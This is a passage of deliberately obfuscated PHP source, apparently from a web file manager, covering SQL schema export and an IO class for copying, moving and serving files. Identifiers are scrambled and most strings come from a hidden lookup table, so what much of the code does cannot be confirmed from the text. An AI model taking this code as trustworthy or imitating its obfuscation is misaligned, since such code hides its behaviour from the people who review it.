$æÚöåÂ[1173] . $²ä¡’Ø° . $æÚöåÂ[58]; $àÚ¾é… = $æÚöåÂ[1174] . $²ä¡’Ø° . $æÚöåÂ[972]; $“§‹ÛÛÌ = $İÍ—Œ³ ->query($å‡ÃĞ®œ); if (empty($“§‹ÛÛÌ)) { $×ÈŸòÈ² = array($æÚöåÂ[874] => $æÚöåÂ[12], $æÚöåÂ[13] => $æÚöåÂ[12]); return $±¼ôÕº ? $×ÈŸòÈ²[$±¼ôÕº] : $×ÈŸòÈ²; } $²°˜Ş·Ñ = $İÍ—Œ³ ->query($àÚ¾é…); $¶áéÊÉ¹ = $æÚöåÂ[12]; $·¯àŠ„÷ = array(); foreach ($²°˜Ş·Ñ as $ªûãğ€) { if (!$¶áéÊÉ¹ && $ªûãğ€[$æÚöåÂ[1175]] == $æÚöåÂ[1176]) { $¶áéÊÉ¹ = $ªûãğ€[$æÚöåÂ[1177]]; } if (isset($·¯àŠ„÷[$ªûãğ€[$æÚöåÂ[1175]]])) { $·¯àŠ„÷[$ªûãğ€[$æÚöåÂ[1175]]][$æÚöåÂ[1178]][] = $ªûãğ€[$æÚöåÂ[1177]]; continue; } $·¯àŠ„÷[$ªûãğ€[$æÚöåÂ[1175]]] = array($æÚöåÂ[1179] => $ªûãğ€[$æÚöåÂ[1175]], $æÚöåÂ[1178] => array($ªûãğ€[$æÚöåÂ[1177]]), $æÚöåÂ[1180] => $ªûãğ€[$æÚöåÂ[1181]] == $æÚöåÂ[91] ? 0 : 1); } $¼€éÒ  = array(); foreach ($·¯àŠ„÷ as $ªûãğ€) { $§»ÛòĞ¢ = $ªûãğ€[$æÚöåÂ[1179]] == $æÚöåÂ[1176]; $‚¡õÇ£¤ = array($æÚöåÂ[1182], $ªûãğ€[$æÚöåÂ[1180]] == $æÚöåÂ[91] && !$§»ÛòĞ¢ ? $æÚöåÂ[1183] : $æÚöåÂ[12], $æÚöåÂ[1184], $æÚöåÂ[1185] . $²ä¡’Ø° . $æÚöåÂ[11] . ($§»ÛòĞ¢ ? $æÚöåÂ[1186] : $ªûãğ€[$æÚöåÂ[1179]]) . $æÚöåÂ[121], $æÚöåÂ[1187], $æÚöåÂ[121] . $²ä¡’Ø° . $æÚöåÂ[121], $æÚöåÂ[1188] . implode($æÚöåÂ[1189], $ªûãğ€[$æÚöåÂ[1178]]) . $æÚöåÂ[1190]); $¼€éÒ [] = implode($æÚöåÂ[53], $‚¡õÇ£¤) . $æÚöåÂ[74]; } $¹Ñª÷ãı = array(); $ğ»æö„ = array($æÚöåÂ[1191] => $æÚöåÂ[1192], $æÚöåÂ[1192] => $æÚöåÂ[1192], $æÚöåÂ[375] => $æÚöåÂ[401], $æÚöåÂ[374] => $æÚöåÂ[401]); foreach ($“§‹ÛÛÌ as $ªûãğ€) { $‚¡õÇ£¤ = array($æÚöåÂ[121] . $ªûãğ€[$æÚöåÂ[1193]] . $æÚöåÂ[121], isset($ğ»æö„[$ªûãğ€[$æÚöåÂ[1194]]]) ? $ğ»æö„[$ªûãğ€[$æÚöåÂ[1194]]] : $ªûãğ€[$æÚöåÂ[1195]], $ªûãğ€[$æÚöåÂ[1196]] == $æÚöåÂ[970] ? $æÚöåÂ[1197] : $æÚöåÂ[1198], $ªûãğ€[$æÚöåÂ[1193]] == $¶áéÊÉ¹ ? $æÚöåÂ[1199] : $æÚöåÂ[12], $ªûãğ€[$æÚöåÂ[1021]] ? strtoupper(str_replace($æÚöåÂ[11], $æÚöåÂ[12], $ªûãğ€[$æÚöåÂ[1021]])) : $æÚöåÂ[12]); $¹Ñª÷ãı[] = trim(implode($æÚöåÂ[53], $‚¡õÇ£¤)); } $­³€âÏÁ = array($æÚöåÂ[1200] . $²ä¡’Ø° . $æÚöåÂ[1201], $æÚöåÂ[1202] . $²ä¡’Ø° . $æÚöåÂ[1203], implode($æÚöåÂ[50] . PHP_EOL, $¹Ñª÷ãı), $æÚöåÂ[1018]); $Ö¯¢ĞŸ† = implode(PHP_EOL, array_merge($­³€âÏÁ, $¼€éÒ )); if ($±¼ôÕº && $±¼ôÕº == $æÚöåÂ[13]) { return $Ö¯¢ĞŸ†; } $×ÈŸòÈ² = array($æÚöåÂ[874] => $õ¬–óĞ, $æÚöåÂ[13] => $Ö¯¢ĞŸ†); return $±¼ôÕº ? $×ÈŸòÈ²[$±¼ôÕº] : $×ÈŸòÈ²; } public function sqlFromSqlite($±ßéë²ï, $˜×¬Èøè = '') { $äì¬¦ó… =& $_SERVER[äô®•½Â]; $à»º³ø“ = $this->model()->db(); $¢æ¿Š’ = "\x50\x52\101\x47\x4d\101\x20\124\101\x42\x4c\105\137\x49\116\x46\117\x20\x28\x27{$±ßéë²ï}\47\x29"; $¬áÂ— = "\123\105\x4c\x45\x43\124\40\x2a\40\106\x52\x4f\115\x20\x73\161\154\151\164\145\137\x6d\x61\163\164\x65\162\40\127\x48\x45\x52\105\40\164\x62\154\137\x6e\141\x6d\x65\x20\75\40\x27{$±ßéë²ï}\x27"; $¦¢èÑ£… = $à»º³ø“->query($¢æ¿Š’); if (empty($¦¢èÑ£…)) { $¥¹˜­’ = array($äì¬¦ó…[874] => $äì¬¦ó…[12], $äì¬¦ó…[13] => $äì¬¦ó…[12]); return $˜×¬Èøè ? $¥¹˜­’[$˜×¬Èøè] : $¥¹˜­’; } $ŠèÂ¡ó = $à»º³ø“->query($¬áÂ—); $ÚŠí½ì = $ÒÕËßåê = array(); foreach ($ŠèÂ¡ó as $‚ş›½’¸) { if ($‚ş›½’¸[$äì¬¦ó…[33]] == $äì¬¦ó…[368]) { $ÚŠí½ì[] = $‚ş›½’¸[$äì¬¦ó…[1204]]; } else { $ÒÕËßåê[$‚ş›½’¸[$äì¬¦ó…[32]]] = $‚ş›½’¸[$äì¬¦ó…[1204]]; } } $Äõ¶ŒŞì = array_merge(array($äì¬¦ó…[1200] . $±ßéë²ï . $äì¬¦ó…[121]), $ÚŠí½ì, array_values($ÒÕËßåê)); $Äõ¶ŒŞì = implode($äì¬¦ó…[74] . PHP_EOL, $Äõ¶ŒŞì) . $äì¬¦ó…[74]; if ($˜×¬Èøè && $˜×¬Èøè == $äì¬¦ó…[13]) { return $Äõ¶ŒŞì; } $„¤¼¼ª = array(); foreach ($ÒÕËßåê as $ËëßØË => $ã‚¬é†‘) { $¿øçü¨ğ = str_replace($äì¬¦ó…[1205] . $±ßéë²ï . $äì¬¦ó…[11], $äì¬¦ó…[12], $ËëßØË); $¿øçü¨ğ = str_replace($±ßéë²ï . $äì¬¦ó…[11], $äì¬¦ó…[12], $ËëßØË); $½äÜÁñ = str_replace(array($äì¬¦ó…[121], $äì¬¦ó…[1029]), $äì¬¦ó…[472], substr($ã‚¬é†‘, stripos($ã‚¬é†‘, $äì¬¦ó…[349]))); $„¤¼¼ª[$¿øçü¨ğ] = $½äÜÁñ; } $ã„ùĞÎÊ = array(); $ô²îöØå = array($äì¬¦ó…[1192] => $äì¬¦ó…[1206], $äì¬¦ó…[401] => $äì¬¦ó…[1207]); $ª½ˆ®ø = $¦´Òù«– = $äì¬¦ó…[12]; foreach ($¦¢èÑ£… as $‚ş›½’¸) { if ($‚ş›½’¸[$äì¬¦ó…[57]] == $äì¬¦ó…[91]) { $ª½ˆ®ø = $‚ş›½’¸[$äì¬¦ó…[32]]; } $—ˆ­¥Ï… = $‚ş›½’¸[$äì¬¦ó…[33]]; if ($—ˆ­¥Ï… == $äì¬¦ó…[1208] && isset($„¤¼¼ª[$‚ş›½’¸[$äì¬¦ó…[32]]])) { $—ˆ­¥Ï… = $äì¬¦ó…[1209]; } $à˜âñ„Í = array($äì¬¦ó…[472] . $‚ş›½’¸[$äì¬¦ó…[32]] . $äì¬¦ó…[472], _get($ô²îöØå, $—ˆ­¥Ï…, $—ˆ­¥Ï…), $‚ş›½’¸[$äì¬¦ó…[35]] == $äì¬¦ó…[91] ? $äì¬¦ó…[1197] : $äì¬¦ó…[1210] . $‚ş›½’¸[$äì¬¦ó…[56]], $‚ş›½’¸[$äì¬¦ó…[57]] == $äì¬¦ó…[91] ? $äì¬¦ó…[1211] : $äì¬¦ó…[12]); $ã„ùĞÎÊ[] = trim(implode($äì¬¦ó…[53], $à˜âñ„Í)); } foreach ($„¤¼¼ª as $¿øçü¨ğ => $½äÜÁñ) { if ($¿øçü¨ğ == $äì¬¦ó…[1186]) { $»¸Ëê÷Á = $¦´Òù«– = $äì¬¦ó…[1212] . $ª½ˆ®ø . $äì¬¦ó…[1213]; } else { $»¸Ëê÷Á = (stripos($¿øçü¨ğ, $äì¬¦ó…[11]) ? $äì¬¦ó…[1214] : $äì¬¦ó…[12]) . ($äì¬¦ó…[1215] . $¿øçü¨ğ . $äì¬¦ó…[1216] . $½äÜÁñ); } $ã„ùĞÎÊ[] = $»¸Ëê÷Á; } if ($ª½ˆ®ø && !$¦´Òù«–) { $ã„ùĞÎÊ = array_merge(array($äì¬¦ó…[1212] . $ª½ˆ®ø . $äì¬¦ó…[1213]), $ã„ùĞÎÊ); } $Î¹†Ü‰ü = array($äì¬¦ó…[1217] . $±ßéë²ï . $äì¬¦ó…[1218], $äì¬¦ó…[1219] . $±ßéë²ï . $äì¬¦ó…[1220], implode($äì¬¦ó…[50] . PHP_EOL, $ã„ùĞÎÊ), $äì¬¦ó…[1221]); $½ÔšôƒÎ = implode(PHP_EOL, $Î¹†Ü‰ü); if ($˜×¬Èøè && $˜×¬Èøè == $äì¬¦ó…[874]) { return $½ÔšôƒÎ; } $¥¹˜­’ = array($äì¬¦ó…[874] => $½ÔšôƒÎ, $äì¬¦ó…[13] => $Äõ¶ŒŞì); return $˜×¬Èøè ? $¥¹˜­’[$˜×¬Èøè] : $¥¹˜­’; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ä’ìÂ‘, $ä½©Ìâê) { $––…¾ë‡ =& $_SERVER[äô®•½Â]; $±Æ‚ĞÀ« = $ä½©Ìâê; $GLOBALS[$––…¾ë‡[1222]] = $––…¾ë‡[1223] . $Ä’ìÂ‘; Hook::trigger($––…¾ë‡[1223] . $Ä’ìÂ‘ . $––…¾ë‡[1224], $±Æ‚ĞÀ«); $ÜüÎ«œ± = self::driverMake($ä½©Ìâê[0]); if (!$ÜüÎ«œ±) { return !1; } if ($Ä’ìÂ‘ == $––…¾ë‡[634] || $Ä’ìÂ‘ == $––…¾ë‡[636] || $Ä’ìÂ‘ == $––…¾ë‡[1225]) { if (!trim($ÜüÎ«œ±->path . $––…¾ë‡[465], $––…¾ë‡[8])) { return !1; } } if (method_exists($ÜüÎ«œ±, $Ä’ìÂ‘)) { $ïÖ®˜œ = @call_user_func_array(array($ÜüÎ«œ±, $Ä’ìÂ‘), $ä½©Ìâê); } else { if (method_exists($ÜüÎ«œ±, $––…¾ë‡[1226])) { $ïÖ®˜œ = @call_user_func_array(array($ÜüÎ«œ±, $Ä’ìÂ‘), $ä½©Ìâê); } else { if (method_exists(self, $Ä’ìÂ‘)) { $ïÖ®˜œ = @call_user_func_array(array(self, $Ä’ìÂ‘), $ä½©Ìâê); } else { $ïÖ®˜œ = call_user_func_array(array(parent, $Ä’ìÂ‘), $ä½©Ìâê); } } } Hook::trigger($––…¾ë‡[1223] . $Ä’ìÂ‘ . $––…¾ë‡[1227], $±Æ‚ĞÀ«, $ïÖ®˜œ); return $ïÖ®˜œ; } public static function init($¢“çşÃÃ) { return self::driverMake($¢“çşÃÃ); } public static function copy($Ş¬·íÂø, $¥¿ÖÁ¼, $¡¡ïÚşÑ = false, $áÆŒµˆ¢ = false) { return self::copyMoveStart($Ş¬·íÂø, $¥¿ÖÁ¼, $¡¡ïÚşÑ, $_SERVER[äô®•½Â][634], $áÆŒµˆ¢); } public static function move($Ö†×ë“–, $—ñ²Üµ, $îˆƒ·ıß = false, $®æ¦ªå… = false) { return self::copyMoveStart($Ö†×ë“–, $—ñ²Üµ, $îˆƒ·ıß, $_SERVER[äô®•½Â][636], $®æ¦ªå…); } public static function copyMoveChildren($ÆÏ¯¥Æ€, $ñ¦ƒŠª¸, $ÒèÕƒ = "\143\x6f\160\x79", $Ø¡Ğ§Ş = REPEAT_REPLACE) { $‡×ÕÉÄì =& $_SERVER[äô®•½Â]; $ŸŒ»ê” = $ÆÏ¯¥Æ€; $ßì…õêÛ = self::driverMake($ÆÏ¯¥Æ€); $Æ£¿Âıù = $ßì…õêÛ->listPath($ÆÏ¯¥Æ€, !0); $ÜèŞ ã = array_merge($Æ£¿Âıù[$‡×ÕÉÄì[86]], $Æ£¿Âıù[$‡×ÕÉÄì[85]]); foreach ($ÜèŞ ã as $ï¶ı¾º) { self::copyMoveStart($ï¶ı¾º[$‡×ÕÉÄì[87]], $ñ¦ƒŠª¸, $Ø¡Ğ§Ş, $ÒèÕƒ, !1); } if ($ÒèÕƒ == $‡×ÕÉÄì[636]) { self::remove($ŸŒ»ê”); } } private static function copyMoveStart($¾ª™ö™´, $‰œÇÖ, $ûò‚ Í, $õñ‚å“Ø, $ø®àƒ©®) { $é†ƒÙ’ =& $_SERVER[äô®•½Â]; $÷®íñ¶Ÿ = array($¾ª™ö™´, $‰œÇÖ, $ûò‚ Í, $ø®àƒ©®); Hook::trigger($é†ƒÙ’[1223] . $õñ‚å“Ø . $é†ƒÙ’[1224], $÷®íñ¶Ÿ); $Œ¤œéÅĞ = self::copyMove($¾ª™ö™´, $‰œÇÖ, $ûò‚ Í, $õñ‚å“Ø, $ø®àƒ©®); Hook::trigger($é†ƒÙ’[1223] . $õñ‚å“Ø . $é†ƒÙ’[1227], $÷®íñ¶Ÿ, $Œ¤œéÅĞ); return $Œ¤œéÅĞ; } public static function saveFile($–ŒºÆ÷Ÿ, $‚Æ³¡·, $¹Ú£ı÷ù = true) { $ÚçíÊÊÆ =& $_SERVER[äô®•½Â]; $¾áÅØ¨ = self::info($‚Æ³¡·); $¦´ÙÒ´ = self::driverMake($–ŒºÆ÷Ÿ); $È¼æäçê = self::driverMake($‚Æ³¡·); $¢ŞÏµÅ¬ = !1; if ($È¼æäçê->pathParse[$ÚçíÊÊÆ[1228]]) { $¢ŞÏµÅ¬ = $È¼æäçê; $ùş¶£Š¤ = $È¼æäçê->pathParse[$ÚçíÊÊÆ[1228]]; $È¼æäçê = self::driverMake($ùş¶£Š¤); } if ($¦´ÙÒ´->pathParse[$ÚçíÊÊÆ[1228]]) { $™˜ôÈ® = $¦´ÙÒ´->pathParse[$ÚçíÊÊÆ[1228]]; $¦´ÙÒ´ = self::driverMake($™˜ôÈ®); } $°òšã«™ = $È¼æäçê->pathFather($‚Æ³¡·); $ü½á²Ê = !0; if (!$¹Ú£ı÷ù && self::driverIsSame($¦´ÙÒ´, $È¼æäçê)) { $ü½á²Ê = !1; } $ğÑÈ— = self::copyFile($¦´ÙÒ´, $–ŒºÆ÷Ÿ, $È¼æäçê, $°òšã«™, $¾áÅØ¨[$ÚçíÊÊÆ[32]], $ü½á²Ê); if ($¢ŞÏµÅ¬) { $ğÑÈ— = $¢ŞÏµÅ¬->getPathOuter($ğÑÈ—); } return $ğÑÈ—; } private static function copyMove($ÅŠ«ãÆ¸, $Î³Ÿˆ£ù, $­ÒÒ°†ò, $‚ãóéÔâ, $îÃÉúôÆ = false) { $éáÑâÅù =& $_SERVER[äô®•½Â]; if (!$ÅŠ«ãÆ¸ || $ÅŠ«ãÆ¸ == $éáÑâÅù[8] || !$Î³Ÿˆ£ù) { return !1; } ignore_timeout(); $ƒ˜›ôßÀ = self::driverMake($ÅŠ«ãÆ¸); $½©ù”Èò = self::driverMake($Î³Ÿˆ£ù); $ÙÌñ İå = $‚ãóéÔâ == $éáÑâÅù[636]; $˜û•ÎÚë = !1; if ($½©ù”Èò->pathParse[$éáÑâÅù[1228]]) { $˜û•ÎÚë = $½©ù”Èò; $Î³Ÿˆ£ù = $½©ù”Èò->pathParse[$éáÑâÅù[1228]]; $½©ù”Èò = self::driverMake($Î³Ÿˆ£ù); } if ($ƒ˜›ôßÀ->pathParse[$éáÑâÅù[1228]]) { $ÅŠ«ãÆ¸ = $ƒ˜›ôßÀ->pathParse[$éáÑâÅù[1228]]; $ƒ˜›ôßÀ = self::driverMake($ÅŠ«ãÆ¸); } self::check($ƒ˜›ôßÀ, $ÅŠ«ãÆ¸, $½©ù”Èò, $Î³Ÿˆ£ù); Hook::trigger($éáÑâÅù[1229], $ƒ˜›ôßÀ, $ÅŠ«ãÆ¸, $½©ù”Èò, $Î³Ÿˆ£ù); $ïä³§Àò = self::driverIsSame($ƒ˜›ôßÀ, $½©ù”Èò); if ($ïä³§Àò) { if ($‚ãóéÔâ == $éáÑâÅù[636] && !method_exists($½©ù”Èò, $éáÑâÅù[1230]) && trim($Î³Ÿˆ£ù, $éáÑâÅù[8]) == trim($½©ù”Èò->pathFather($ÅŠ«ãÆ¸), $éáÑâÅù[8])) { if ($ƒ˜›ôßÀ->pathThis($ÅŠ«ãÆ¸) != $îÃÉúôÆ && !$ƒ˜›ôßÀ->isOsDriver()) { return $ƒ˜›ôßÀ->rename($ÅŠ«ãÆ¸, $îÃÉúôÆ); } return $½©ù”Èò->getPathOuter($ÅŠ«ãÆ¸); } if (method_exists($½©ù”Èò, $‚ãóéÔâ)) { return $½©ù”Èò->{$‚ãóéÔâ}($ÅŠ«ãÆ¸, $Î³Ÿˆ£ù, $­ÒÒ°†ò, $îÃÉúôÆ); } } if ($ïä³§Àò && $‚ãóéÔâ == $éáÑâÅù[636] && $½©ù”Èò->getType() == $éáÑâÅù[109]) { $Ùşè ë = $½©ù”Èò->movePath($ÅŠ«ãÆ¸, $Î³Ÿˆ£ù, $îÃÉúôÆ); if ($Ùşè ë) { return $Ùşè ë; } } $—ş‹ıï¥ = $ƒ˜›ôßÀ->isFile($ÅŠ«ãÆ¸); if (!$—ş‹ıï¥ && $½©ù”Èò->getType() == $éáÑâÅù[823] && $ƒ˜›ôßÀ->getType() == $éáÑâÅù[109]) { $Ùşè ë = $½©ù”Èò->copyFolderFromIO($ƒ˜›ôßÀ, $ÅŠ«ãÆ¸, $Î³Ÿˆ£ù, $­ÒÒ°†ò, $ÙÌñ İå, $îÃÉúôÆ); } else { $Ùşè ë = self::copyPath($ƒ˜›ôßÀ, $ÅŠ«ãÆ¸, $½©ù”Èò, $Î³Ÿˆ£ù, $­ÒÒ°†ò, $ÙÌñ İå, $—ş‹ıï¥, $îÃÉúôÆ); } if ($Ùşè ë && $ÙÌñ İå) { $ƒ˜›ôßÀ->remove($ÅŠ«ãÆ¸); } if ($˜û•ÎÚë) { $Ùşè ë = $˜û•ÎÚë->getPathOuter($Ùşè ë); } return $Ùşè ë; } private static function check($ÈÏÊ²³Û, $©´Ã•ºÌ, $áÄ™ë¿ü, &$”¾ĞÔ›²) { $ÏŞö»˜Ï =& $_SERVER[äô®•½Â]; if (self::driverIsSame($ÈÏÊ²³Û, $áÄ™ë¿ü) && $ÈÏÊ²³Û->isFolder($©´Ã•ºÌ) && $ÈÏÊ²³Û->isParentOf($©´Ã•ºÌ, $”¾ĞÔ›²)) { show_json(LNG($ÏŞö»˜Ï[1231]), !1); } if (!$ÈÏÊ²³Û->exist($©´Ã•ºÌ)) { show_json(LNG($ÏŞö»˜Ï[108]), !1); } } private static function copyPath($Ñş¥äÃ˜, $®ÃƒÃü®, $üÑÏàä¹, $“£åˆ»á, $º×‹‡¼Ç, $¢Ç£ àÈ, $‰¾ŠƒØÈ, $•¶İ´ø† = false, $Ø¨ï÷ÔÂ = true) { $Åµ“„Ôè =& $_SERVER[äô®•½Â]; $Ïâ†ğ›Â = empty($•¶İ´ø†) && $•¶İ´ø† !== $Åµ“„Ôè[231] ? $Ñş¥äÃ˜->pathThis($®ÃƒÃü®) : $•¶İ´ø†; if ($º×‹‡¼Ç) { $ì­™¹ğ = $üÑÏàä¹->fileNameExist($“£åˆ»á, $Ïâ†ğ›Â); $ÙÅŒ¯¢ƒ = $Ïâ†ğ›Â; $Ïâ†ğ›Â = $üÑÏàä¹->fileNameAuto($“£åˆ»á, $Ïâ†ğ›Â, $º×‹‡¼Ç, !$‰¾ŠƒØÈ); if (!$ì­™¹ğ || $ÙÅŒ¯¢ƒ != $Ïâ†ğ›Â) { $º×‹‡¼Ç = !1; } if ($Ø¨ï÷ÔÂ && !$º×‹‡¼Ç) { $üÑÏàä¹->_data[$Åµ“„Ôè[1232]] = !0; } } if ($‰¾ŠƒØÈ) { return self::copyFile($Ñş¥äÃ˜, $®ÃƒÃü®, $üÑÏàä¹, $“£åˆ»á, $Ïâ†ğ›Â, $¢Ç£ àÈ); } if ($º×‹‡¼Ç == REPEAT_RENAME_FOLDER) { $º×‹‡¼Ç = !1; } $ÏğÍ‚ò° = rtrim($“£åˆ»á, $Åµ“„Ôè[8]) . $Åµ“„Ôè[8] . $Ïâ†ğ›Â; $ë¯©†ŒÅ = $üÑÏàä¹->mkdir($üÑÏàä¹->getPath($ÏğÍ‚ò°), $º×‹‡¼Ç); $“£åˆ»á = $üÑÏàä¹->getPathInner($ë¯©†ŒÅ); $»ØÂŞÍì = $Ñş¥äÃ˜->listPath($®ÃƒÃü®, !0); $»ØÂŞÍì = is_array($»ØÂŞÍì) ? $»ØÂŞÍì : array($Åµ“„Ôè[86] => array(), $Åµ“„Ôè[85] => array()); $¯´ÓŸÈ· = array_merge($»ØÂŞÍì[$Åµ“„Ôè[86]], $»ØÂŞÍì[$Åµ“„Ôè[85]]); foreach ($¯´ÓŸÈ· as $ŒÙ­Ğõ) { $à‚Á¬‡ = $ŒÙ­Ğõ[$Åµ“„Ôè[33]] == $Åµ“„Ôè[233]; $®ÃƒÃü® = $Ñş¥äÃ˜->getPathInner($ŒÙ­Ğõ[$Åµ“„Ôè[87]]); $¹­ğøª = self::copyPath($Ñş¥äÃ˜, $®ÃƒÃü®, $üÑÏàä¹, $“£åˆ»á, $º×‹‡¼Ç, $¢Ç£ àÈ, $à‚Á¬‡, !1, !1); if (!$¹­ğøª) { IO::errorTips($Åµ“„Ôè[1233] . $®ÃƒÃü® . $Åµ“„Ôè[73] . $“£åˆ»á); } } self::copyMoveKeepInfo($Ñş¥äÃ˜, $®ÃƒÃü®, $ë¯©†ŒÅ); return $ë¯©†ŒÅ; } private static function copyFile($Ğê½“ó, $ú„¸”´², $öˆ¹°Ô, $´¨À¤Ëİ, $ş¨şˆÁ, $ŸÜïûÜï) { $©é«È­ß =& $_SERVER[äô®•½Â]; $´¨À¤Ëİ = $öˆ¹°Ô->getPath(rtrim($´¨À¤Ëİ, $©é«È­ß[8]) . $©é«È­ß[8] . $ş¨şˆÁ); $ê‹–ÇÇˆ = $©é«È­ß[1234] . time() . rand_string(5); Hook::trigger($©é«È­ß[1235], $Ğê½“ó, $ú„¸”´², $öˆ¹°Ô, $´¨À¤Ëİ, $ş¨şˆÁ, $ê‹–ÇÇˆ); if (self::driverIsSame($Ğê½“ó, $öˆ¹°Ô)) { if ($ŸÜïûÜï) { $‚’£à½« = $öˆ¹°Ô->moveFile($ú„¸”´², $´¨À¤Ëİ); } else { $‚’£à½« = $öˆ¹°Ô->copyFile($ú„¸”´², $´¨À¤Ëİ); } Hook::trigger($©é«È­ß[1236], $Ğê½“ó, $ú„¸”´², $öˆ¹°Ô, $´¨À¤Ëİ, $ş¨şˆÁ, $‚’£à½«); self::copyMoveKeepInfo($Ğê½“ó, $ú„¸”´², $‚’£à½«); return $‚’£à½«; } $•ªñëò = TEMP_FILES; if ($GLOBALS[$©é«È­ß[6]][$©é«È­ß[92]][$©é«È­ß[864]]) { $•ªñëò = $GLOBALS[$©é«È­ß[6]][$©é«È­ß[92]][$©é«È­ß[864]]; } $åÎş’³ç = $•ªñëò; mk_dir($åÎş’³ç); $¤Ñ¨óëâ = $åÎş’³ç . $ê‹–ÇÇˆ; $É¨ìÀè‚ = $¤Ñ¨óëâ; $¤Ñ¨óëâ = $Ğê½“ó->download($ú„¸”´², $¤Ñ¨óëâ); $¤Ñ¨óëâ = $Ğê½“ó->iconvApp($¤Ñ¨óëâ); if (substr($¤Ñ¨óëâ, strlen($•ªñëò)) == $•ªñëò) { $ŸÜïûÜï = !0; } $‚’£à½« = $öˆ¹°Ô->upload($´¨À¤Ëİ, $¤Ñ¨óëâ, $ŸÜïûÜï); self::remove($É¨ìÀè‚); Hook::trigger($©é«È­ß[1236], $Ğê½“ó, $ú„¸”´², $öˆ¹°Ô, $´¨À¤Ëİ, $ş¨şˆÁ, $‚’£à½«); self::copyMoveKeepInfo($Ğê½“ó, $ú„¸”´², $‚’£à½«); return $‚’£à½«; } private static function copyMoveKeepInfo($ğ€âàØƒ, $‰ƒ¢½ÈÖ, $ÔÖÈ‡‰Ò) { if (!$ÔÖÈ‡‰Ò) { return; } $ã¦ƒŸ¨ = $ğ€âàØƒ->info($‰ƒ¢½ÈÖ); if (!is_array($ã¦ƒŸ¨)) { return; } IO::setModifyTime($ÔÖÈ‡‰Ò, $ã¦ƒŸ¨[$_SERVER[äô®•½Â][88]]); } public static function pathFather($Ğ²Â¥ø˜) { $òøÑ½ó± = IO::init($Ğ²Â¥ø˜); $ô·Ñô¯÷ = $òøÑ½ó±->pathFather($òøÑ½ó±->path); return $òøÑ½ó±->getPathOuter($ô·Ñô¯÷); } public static function fileOut($°¿ÄÈä, $†Ÿ½ˆÑ = false, $µ¸Û¤® = false, $ŒÂø‹á¹ = '') { $áÌ™Î´¡ = self::driverMake($°¿ÄÈä); if ($áÌ™Î´¡->isFileOutServer()) { return $áÌ™Î´¡->fileOutServer($°¿ÄÈä, $†Ÿ½ˆÑ, $µ¸Û¤®, $ŒÂø‹á¹); } return $áÌ™Î´¡->fileOut($°¿ÄÈä, $†Ÿ½ˆÑ, $µ¸Û¤®, $ŒÂø‹á¹); } public static function fileOutImage($ó’şğÚ, $Ö­‹Áş˜ = 250) { $ˆ«¦Õ = array(250, 600, 1200, 2000, 3000, 5000); for ($õæÄÎ¬Ä = 0; $õæÄÎ¬Ä < count($ˆ«¦Õ); $õæÄÎ¬Ä++) { if ($õæÄÎ¬Ä == 0 && $Ö­‹Áş˜ <= $ˆ«¦Õ[$õæÄÎ¬Ä]) { $Ö­‹Áş˜ = $ˆ«¦Õ[$õæÄÎ¬Ä]; break; } else { if ($Ö­‹Áş˜ > $ˆ«¦Õ[$õæÄÎ¬Ä - 1] && $Ö­‹Áş˜ <= $ˆ«¦Õ[$õæÄÎ¬Ä]) { $Ö­‹Áş˜ = $ˆ«¦Õ[$õæÄÎ¬Ä]; break; } else { if ($õæÄÎ¬Ä == count($ˆ«¦Õ) - 1 && $Ö­‹Áş˜ > $ˆ«¦Õ[$õæÄÎ¬Ä]) { $Ö­‹Áş˜ = $ˆ«¦Õ[$õæÄÎ¬Ä]; break; } } } } $ôÏÛš¡× = self::driverMake($ó’şğÚ); if ($ôÏÛš¡×->isFileOutServer()) { return $ôÏÛš¡×->fileOutImageServer($ó’şğÚ, $Ö­‹Áş˜); } return $ôÏÛš¡×->fileOutImage($ó’şğÚ, $Ö­‹Áş˜); } private static function driverIsSame($ò×áÃÕ¾, $Ôóä¥¢½) { $ÛÁª¤Æ =& $_SERVER[äô®•½Â]; $ªõıÕ– = $ò×áÃÕ¾->getType(); $Ä¥ı…íÔ = $Ôóä¥¢½->getType(); if ($ªõıÕ– != $Ä¥ı…íÔ) { return !1; } if ($ªõıÕ– == $ÛÁª¤Æ[823]) { return !0; } if ($ªõıÕ– == $ÛÁª¤Æ[109]) { return !0; } if ($ò×áÃÕ¾->pathDriver == $Ôóä¥¢½->pathDriver) { return !0; } return !1; } public static function copyUpdate($ş€È¾Â‚, $¬ÇÙÇ¾) { $À€Û…Á =& $_SERVER[äô®•½Â]; if (!IO::exist($ş€È¾Â‚)) { return !1; } if (!IO::exist($¬ÇÙÇ¾)) { IO::mkdir($¬ÇÙÇ¾); } $çÍ‰äå¹ = array_to_keyvalue(self::listAllSimple($ş€È¾Â‚), $À€Û…Á[87]); $½ÁÌî˜û = array_to_keyvalue(self::listAllSimple($¬ÇÙÇ¾), $À€Û…Á[87]); $ÇÄÔÁÓ´ = array(); $ÂØÜƒİÁ = array(); foreach ($çÍ‰äå¹ as $ÖğÔª† => $Ûö¾–ò) { if (isset($½ÁÌî˜û[$ÖğÔª†])) { if ($Ûö¾–ò[$À€Û…Á[78]] == 1) { continue; } if ($½ÁÌî˜û[$ÖğÔª†][$À€Û…Á[79]] == $Ûö¾–ò[$À€Û…Á[79]]) { continue; } } if ($Ûö¾–ò[$À€Û…Á[78]] == 1) { $ÂØÜƒİÁ[] = $¬ÇÙÇ¾ . $À€Û…Á[8] . trim($ÖğÔª†, $À€Û…Á[8]); continue; } $ïÇŞÖî¾ = strstr(trim($ÖğÔª†, $À€Û…Á[8]), $À€Û…Á[8]) ? get_path_father($ÖğÔª†) : $À€Û…Á[12]; $ÇÄÔÁÓ´[] = array($À€Û…Á[1237] => $Ûö¾–ò[$À€Û…Á[89]], $À€Û…Á[1238] => rtrim($¬ÇÙÇ¾, $À€Û…Á[8]) . $À€Û…Á[8] . $ïÇŞÖî¾, $À€Û…Á[1239] => $Ûö¾–ò); } $Ò˜ãº = array($À€Û…Á[233] => $ÇÄÔÁÓ´, $À€Û…Á[78] => $ÂØÜƒİÁ); Hook::trigger($À€Û…Á[1240], $ş€È¾Â‚, $¬ÇÙÇ¾, $Ò˜ãº); foreach ($ÂØÜƒİÁ as $Ûö¾–ò) { IO::mkdir($Ûö¾–ò); } foreach ($ÇÄÔÁÓ´ as $Ûö¾–ò) { IO::copy($Ûö¾–ò[$À€Û…Á[1237]], $Ûö¾–ò[$À€Û…Á[1238]], REPEAT_REPLACE); } } public static function fileSubstr($İéœñƒ, $ˆôÙÄÏ‰, $¤õ½·ñ÷ = false) { 